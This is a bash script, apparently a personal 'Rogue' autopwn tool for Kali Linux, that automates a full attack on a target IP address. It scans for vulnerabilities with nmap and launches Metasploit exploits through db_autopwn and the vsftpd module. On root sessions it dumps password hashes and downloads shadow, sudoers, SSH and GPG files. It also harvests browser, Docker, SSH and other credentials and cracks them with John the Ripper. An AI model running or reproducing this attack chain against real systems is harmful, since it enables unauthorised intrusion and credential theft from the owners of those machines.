#!/bin/env bash

# function to check if user is root or not
if [[ $EUID -ne 0 ]]; then
   echo "[!] Run this script as Root User."
   exit 1
fi

# colors defined
RESET=$(tput sgr0)                  # Reset
ROGUE=$(tput setaf 124)             # Red
RED=$(tput setaf 1)                 # Red
YELLOW=$(tput setaf 220)            # Yellow
WHITE=$(tput setaf 7)               # White
ON_GREEN=$(tput setab 22)           # Green
BBLUE=$(tput setaf 4; tput bold)    # Blue
BCYAN=$(tput bold;tput setaf 6)     # Bold Cyan
BYELLOW=$(tput setaf 3; tput bold)  # Yellow

MAIN_PATH=/home/kali/Desktop
REPORT_DIR=$MAIN_PATH/reports
MODULES_DIR=$MAIN_PATH/modules
CREDS_DIR=$MAIN_PATH/creds
FILES_DIR=$MAIN_PATH/files

##############################################################################################

# This function initializes the environment for the shellscript program.
function initialize_(){
    HOME=/
    apt update && apt install -y postgresql postgresql-client fdupes
    service postgresql start && update-rc.d postgresql enable
    msfdb init
    mkdir -p "$REPORT_DIR"  2> /dev/null
    mkdir -p "$MODULES_DIR"  2> /dev/null
    mkdir -p "$CREDS_DIR"  2> /dev/null
    mkdir -p "$FILES_DIR"  2> /dev/null
    git clone https://github.com/ernw/nmap-parse-output.git "$MAIN_PATH/nmap-parse" 2>/dev/null
    wget -O /usr/share/metasploit-framework/plugins/db_autopwn.rb https://raw.githubusercontent.com/hahwul/mad-metasploit/master/mad-metasploit-plugins/db_autopwn.rb 2>/dev/null
    chmod -R 777 "$REPORT_DIR" "$MODULES_DIR" "$CREDS_DIR" "$FILES_DIR" "$MAIN_PATH/nmap-parse"
    }

##############################################################################################

# This function prints a banner with version and contact information
function banner_(){
    echo -e $ROGUE
    echo """
    ▄▄▄         ▄▄ • ▄• ▄▌▄▄▄ .
    ▀▄ █·▪     ▐█ ▀ ▪█▪██▌▀▄.▀·
    ▐▀▀▄  ▄█▀▄ ▄█ ▀█▄█▌▐█▌▐▀▀▪▄
    ▐█•█▌▐█▌.▐▌▐█▄▪▐█▐█▄█▌▐█▄▄▌
    .▀  ▀ ▀█▄▀▪·▀▀▀▀  ▀▀▀  ▀▀▀ 
    $RESET	Version: 0.1.0
    www.linkedin.com/in/gabrielle-decker """
    }

##############################################################################################

# This function runs an nmap scan with the vulners script and saves the output to a file in the report directory.
function nmap_(){
    echo
    echo "${BCYAN}[+]${RESET} Scanning For Vulnerabilities..."
    nmap -T4 -sS -sV -O -A --script=vulners --stats-every 10s $TARGET -oX $REPORT_DIR/scan.xml
    sleep 1
    echo
    echo "${ON_GREEN}${WHITE}[!] Nmap Scan for $TARGET done.${RESET}"
    }

##############################################################################################

# This function sets up the Metasploit workspace by importing the scan report, setting the LHOST to eth1, and saving the changes.
function msfSetup_(){
    echo
    echo "${BCYAN}[+]${RESET} Setting up Metasploit..."
    msfconsole -q -x "db_import reports/scan.xml; hosts -R; setg LHOST eth1; save; exit;"
    sleep 1
    echo
    echo "${ON_GREEN}${WHITE}[!] Workspace is ready.${RESET}"
    }

##############################################################################################

# Create auto.rc file in the modules directory with commands to run autopwn, collect sessions, and export data.
function createAuto_(){
    cat << EOF > $MODULES_DIR/auto.rc
sleep 2
spool reports/autopwn.log
hosts -R
setg LHOST eth1
load db_autopwn
db_autopwn -p -R great -e -r -q 2>/dev/null
sleep 5
use vsftpd
run -j
sleep 20
<ruby>
framework.sessions.each_pair do |sid, session|
  File.open('reports/opened_sessions.txt', 'a') { |f| f.puts(sid) }
  Rex::sleep(1.5)
end
</ruby>
sleep 5
sort -u reports/opened_sessions.txt > reports/sessions.txt
rm -rf reports/opened_sessions.txt
sleep 5
<ruby>
File.open('reports/sessions.txt').each_line do |sid|
  run_single("sessions -u #{sid}")
  Rex::sleep(30)
end
</ruby>
sleep 20
<ruby>
framework.sessions.each_pair do |sid, session|
  File.open('reports/opened_sessions.txt', 'a') { |f| f.puts("Session ID: #{sid}, #{session.inspect}") }
  Rex::sleep(5)
end

File.open('reports/opened_sessions.txt', 'r') do |file|
  file.each_line do |line|
    if line.include?('root')
      sid = line.split(':')[1].split(' ').first
      run_single("sessions -C 'resource modules/post.rc' -i #{sid}")
      Rex::sleep(1.5)
    end
  end
end
</ruby>
sleep 10
resource port_cleaner.rc
sleep 1.5
resource modules/creds.rc
sleep 5
services -o reports/services.csv
hosts -o reports/hosts.csv
creds -o reports/creds.csv
db_export -f xml -o reports/project-export.xml
sessions -K
spool off
exit
EOF
    }

##############################################################################################

# Create post.rc file with various post exploitation modules
function createPost_(){
    cat << EOF > $MODULES_DIR/post.rc
hosts -R
setg LHOST eth1
run post/linux/gather/hashdump
download /etc/passwd files/
download /etc/shadow files/
download /etc/group files/
download /etc/sudoers files/
download ~/.ssh/authorized_keys creds/
download /etc/ssh/sshd_config files/
download ~/.gnupg files/
download /etc/sysctl.conf files/
download /etc/security/limits.conf files/
run post/linux/gather/checkcontainer
run post/linux/gather/checkvm
run post/linux/gather/enum_configs
run post/linux/gather/enum_network
run post/linux/gather/enum_protections
run post/linux/gather/enum_psk
run post/linux/gather/enum_system
run post/linux/gather/enum_users_history
run post/linux/gather/gnome_commander_creds
run post/linux/gather/gnome_keyring_dump
run post/linux/gather/phpmyadmin_credsteal
run post/linux/gather/tor_hiddenservices
run post/multi/gather/check_malware REMOTEFILE=C:\\msfrev.exe
run post/multi/gather/chrome_cookies
run post/multi/gather/docker_creds
run post/multi/gather/enum_vbox
run post/multi/gather/env
run post/multi/gather/fetchmailrc_creds
run post/multi/gather/find_vmx
run post/multi/gather/firefox_creds
run post/multi/gather/gpg_creds
run post/multi/gather/grub_creds
run post/multi/gather/netrc_creds
run post/multi/gather/pgpass_creds
run post/multi/gather/rubygems_api_key
run post/multi/gather/ssh_creds
run post/multi/gather/tomcat_gather
exit
EOF
    }

##############################################################################################

# Create the creds.rc file with the necessary commands to crack and store credentials
function createCreds_(){
    cat << EOF > $MODULES_DIR/creds.rc
unshadow files/passwd files/shadow > creds/combinedCreds
john --single creds/combinedCreds --pot=/home/kali/Desktop/creds/crackedShadow.txt
john --show creds/combinedCreds --pot=/home/kali/Desktop/creds/crackedShadow.txt > creds/creds.txt
chmod 777 files/shadow files/passwd creds/combinedCreds creds/crackedShadow.txt creds/creds.txt
cut -d':' -f1,2 creds/creds.txt | grep ':' > creds/crackedCreds.txt
rm creds/combinedCreds creds/crackedShadow.txt
<ruby>
# Read in the crackedCreds.txt file and iterate through each line
File.open("creds/crackedCreds.txt", "r").each_line do |line|
  # Split the line into the username and password
  username, password = line.chomp.split(':')
  # Add the credentials to the database
  creds = "creds add user:#{username} password:#{password}"
  print_status("Adding credentials: #{creds}")
  run_single(creds)
end
</ruby>
EOF
    }

##############################################################################################

# This function runs the exploits using msfconsole with auto.rc as the resource file.
function autopwn_(){
    echo
    echo "${BCYAN}[+]${RESET} Running exploits..."
    msfconsole -q -r $MODULES_DIR/auto.rc
    }

##############################################################################################

# Generate an HTML report from the nmap XML scan results.
function report_(){
    echo
    echo "${BCYAN}[+]${RESET} Parsing nmap XML..."
    "$MAIN_PATH/nmap-parse/./nmap-parse-output" "$REPORT_DIR/scan.xml" html-bootstrap > "$REPORT_DIR/report.html"
    sleep 1
    echo
    echo "${ON_GREEN}${WHITE}[!] Report found at $REPORT_DIR/report.html${RESET}"
    }

##############################################################################################

# Cleanup files and directories created during the pentest process
function cleanup_(){
  echo
  echo "${BCYAN}[+]${RESET} Performing cleanup..."
  cd /.msf4/loot/
  fdupes -r -d -N .
  find . -type f -empty -delete
  for file in $(find . -name "*.txt" -type f)
  do
      sed -i -E '/^[\s#]*$/d; s/^[[:space:]]+|[[:space:]]+$//g; /^$/d; /^[^[:alnum:]]*#+[^[:alnum:]]*$/d' "$file"
  done
  echo "<html><body>" > $REPORT_DIR/extracted_files.html
  for file in $(find . -name "*.txt" -type f)
  do
    table_rows=""
    while read -r line; do
      table_row="<tr><td>${line%%:*}</td><td>${line#*:}</td></tr>"
      if [[ "$line" != *"#"* ]] || [[ "$line" == *[^#'\s']* ]]; then
        if [ -n "$table_row" ]; then
          table_rows+="$table_row"
        fi
      fi
    done < "$file"
    if [ -n "$table_rows" ]; then
      echo "<details><summary><h1>${file}</h1></summary>" >> $REPORT_DIR/extracted_files.html
      echo "<table border=\"1\">" >> $REPORT_DIR/extracted_files.html
      echo "<tr><th>Line Number</th><th>Line Content</th></tr>" >> $REPORT_DIR/extracted_files.html
      echo "$table_rows" >> $REPORT_DIR/extracted_files.html
      echo "</table><br></details>" >> $REPORT_DIR/extracted_files.html
    fi
  done
  echo "</body></html>" >> $REPORT_DIR/extracted_files.html
  sed -i 's/\x1B\[[0-9;]*[mGK]//g' $REPORT_DIR/autopwn.log
  sleep 1
  echo
  echo "${ON_GREEN}${WHITE}[!] Cleanup done.${RESET}"
  }

##############################################################################################

# This function is used to perform the pentest on the target IP address
function mainf_(){
    initialize_
    clear
    banner_
    echo
    read -r -p "${YELLOW}[!]${RESET} Enter Target IP Address: "$RED TARGET
    nmap_
    msfSetup_
    createAuto_
    createPost_
    createCreds_
    autopwn_
    report_
    cleanup_
    sleep 1.5
    cd $MAIN_PATH
    rm -rf $MAIN_PATH/nmap-parse $MAIN_PATH/modules
    mkdir "$MAIN_PATH/Pentest"
    mv $MAIN_PATH/reports $MAIN_PATH/creds $MAIN_PATH/files "$MAIN_PATH/Pentest"
    chmod -R 777 "$MAIN_PATH/Pentest"
    sleep 2
    echo
    echo "${BYELLOW}[!]${BBLUE} Pentest done. All reports, files, and credentials can be found in 'Pentest'.${RESET}"
    }

##############################################################################################

mainf_
#ENDOFCODE
